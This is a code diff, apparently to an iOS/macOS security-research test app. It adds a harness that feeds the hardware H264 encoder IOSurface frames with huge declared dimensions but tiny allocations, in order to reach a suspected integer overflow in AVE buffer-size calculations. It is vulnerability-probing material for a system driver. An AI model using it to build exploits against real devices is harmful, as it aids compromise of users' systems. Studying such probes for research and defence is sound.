@@ -539,6 +539,96 @@ static void runVTTests(void) {
 }
 
 // ---------------------------------------------------------------------------
+// VT malformed IOSurface frame
+//
+// The hardware H264 encoder rejects 46341x46341 at VTCompressionSessionCreate.
+// This test keeps the session small (so the AVE encoder is selected) and feeds
+// it a CVPixelBuffer backed by an IOSurface whose reported dimensions are huge
+// but whose allocation is tiny. If AVE uses the frame/surface dimensions for
+// its buffer-size math, this is the path that reaches AVE_CalcBufSizeOf*.
+// ---------------------------------------------------------------------------
+
+static CVPixelBufferRef createPixelBufferFromSurface(IOSurfaceRef surf) {
+    CVPixelBufferRef pb = NULL;
+    CVReturn cv = CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
+    logLine(@"  CVPixelBufferCreateWithIOSurface -> %d %p", (int)cv, pb);
+    return pb;
+}
+
+static void runVTMalformedSurface(void) {
+    logLine(@"=== VT malformed IOSurface frame ===");
+    NSDictionary *spec = nil;
+    if (gAVEEncoderID.length) {
+        spec = @{(__bridge NSString *)kVTVideoEncoderSpecification_EncoderID: gAVEEncoderID};
+    }
+    NSDictionary *attrs = @{
+        (__bridge NSString *)kCVPixelBufferPixelFormatTypeKey:
+            @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
+        (__bridge NSString *)kCVPixelBufferWidthKey: @(1920),
+        (__bridge NSString *)kCVPixelBufferHeightKey: @(1080),
+        (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
+    };
+    VTCompressionSessionRef session = NULL;
+    OSStatus st = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264,
+                                             (__bridge CFDictionaryRef)spec,
+                                             (__bridge CFDictionaryRef)attrs, NULL,
+                                             vtOutputCallback, NULL, &session);
+    logLine(@"malformed: VT create 1920x1080 forceAVE=%d -> %d session=%p",
+            spec != nil, (int)st, session);
+    if (st != noErr || session == NULL) return;
+    VTCompressionSessionPrepareToEncodeFrames(session);
+
+    struct { int32_t w, h; uint32_t bpe; size_t alloc; } cases[] = {
+        {1920, 1080, 1, 0},          // control: normal allocation
+        {46341, 46341, 1, 0x4000},   // overflow area, tiny allocation
+        {65535, 65535, 1, 0x4000},
+        {-1, -1, 1, 0x4000},
+        {8192, 8192, 1, 0x4000},
+        {16384, 16384, 1, 0x4000},
+    };
+
+    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+        NSMutableDictionary *props = [@{
+            (__bridge NSString *)kIOSurfaceWidth: @(cases[i].w),
+            (__bridge NSString *)kIOSurfaceHeight: @(cases[i].h),
+            (__bridge NSString *)kIOSurfaceBytesPerElement: @(cases[i].bpe),
+            (__bridge NSString *)kIOSurfacePixelFormat:
+                @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
+        } mutableCopy];
+        if (cases[i].alloc) {
+            props[(__bridge NSString *)kIOSurfaceAllocSize] = @(cases[i].alloc);
+        }
+        crumb(@"START IOSurface %dx%d bpe=%u alloc=0x%zx", cases[i].w, cases[i].h,
+              cases[i].bpe, cases[i].alloc);
+        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+        crumb(@"DONE IOSurface %dx%d surf=%p", cases[i].w, cases[i].h, surf);
+        logLine(@"IOSURF request %dx%d bpe=%u alloc=0x%zx -> %p",
+                cases[i].w, cases[i].h, cases[i].bpe, cases[i].alloc, surf);
+        if (!surf) continue;
+
+        logLine(@"  actual w=%zu h=%zu bpr=%zu alloc=0x%zx",
+                IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf),
+                IOSurfaceGetBytesPerRow(surf), IOSurfaceGetAllocSize(surf));
+        CVPixelBufferRef pb = createPixelBufferFromSurface(surf);
+        if (pb) {
+            VTEncodeInfoFlags flags = 0;
+            crumb(@"START malformed encode %dx%d", cases[i].w, cases[i].h);
+            OSStatus est = VTCompressionSessionEncodeFrame(session, pb, kCMTimeZero,
+                                                           CMTimeMake(1, 30), NULL, NULL, &flags);
+            crumb(@"DONE malformed encode %dx%d st=%d", cases[i].w, cases[i].h, (int)est);
+            logLine(@"  encode -> %d flags=0x%x", (int)est, (unsigned)flags);
+            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+            CFRelease(pb);
+        }
+        CFRelease(surf);
+        usleep(200 * 1000);
+    }
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    logLine(@"=== malformed IOSurface frame done ===");
+}
+
+// ---------------------------------------------------------------------------
 // Generic selector scan
 // ---------------------------------------------------------------------------
 
@@ -796,6 +886,7 @@ static void runMachTests(void) {
         @[@"5. Generic media/GPU/HID selector scan", @"btnScan"],
         @[@"6. Mach VM edge cases", @"btnMach"],
         @[@"7. Targeted media/GPU/ANE scan", @"btnTargeted"],
+        @[@"8. VT malformed IOSurface frame", @"btnMalformed"],
         @[@"Share log", @"btnShare"],
         @[@"Clear log", @"btnClear"],
     ];
@@ -928,6 +1019,12 @@ static void runMachTests(void) {
 - (void)btnTargeted {
     [self runOnQueue:@"targeted scan" block:^{
         runTargetedScan();
+    }];
+}
+
+- (void)btnMalformed {
+    [self runOnQueue:@"malformed IOSurface" block:^{
+        runVTMalformedSurface();
     }];
 }
 
